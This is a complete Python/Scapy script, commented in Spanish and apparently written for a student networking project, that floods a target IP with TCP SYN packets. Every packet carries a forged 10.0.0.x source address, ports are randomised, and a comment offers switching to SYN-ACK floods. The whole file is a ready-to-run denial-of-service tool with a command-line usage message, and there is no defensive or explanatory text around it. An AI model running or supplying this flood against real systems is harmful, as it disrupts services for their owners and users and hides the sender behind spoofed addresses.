#!/usr/bin/env python3
"""
Generador de ataques TCP Flood Genérico
Proyecto RSE 2025
"""

import sys
import time
from scapy.all import IP, TCP, send, RandShort

def tcp_flood(target_ip, target_port=None, num_packets=100, interval=0.01):
    print(f"[*] Iniciando TCP Flood contra {target_ip}")
    
    for i in range(num_packets):
        ip = IP(src=f"10.0.0.{(i % 250) + 4}", dst=target_ip)
        
        # Si no se especifica puerto, usamos puertos aleatorios
        dport = target_port if target_port else int(RandShort())
        
        tcp = TCP(
            sport=RandShort(),
            dport=dport,
            flags='S' # Puedes cambiar a 'SA' para SYN-ACK Flood
        )
        
        packet = ip / tcp
        send(packet, iface="atacante-eth0", verbose=0)
        
        if (i + 1) % 20 == 0:
            print(f"[+] Enviados {i + 1}/{num_packets} paquetes")
        
        time.sleep(interval)

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Uso: python3 tcp_flood.py <IP_victima> [puerto] [num_paquetes] [intervalo]")
        sys.exit(1)
    
    target = sys.argv[1]
    port = int(sys.argv[2]) if (len(sys.argv) > 2 and sys.argv[2] != '0') else None
    packets = int(sys.argv[3]) if len(sys.argv) > 3 else 200
    interval = float(sys.argv[4]) if len(sys.argv) > 4 else 0.01
    
    try:
        tcp_flood(target, port, packets, interval)
    except KeyboardInterrupt:
        print("\n[!] Detenido")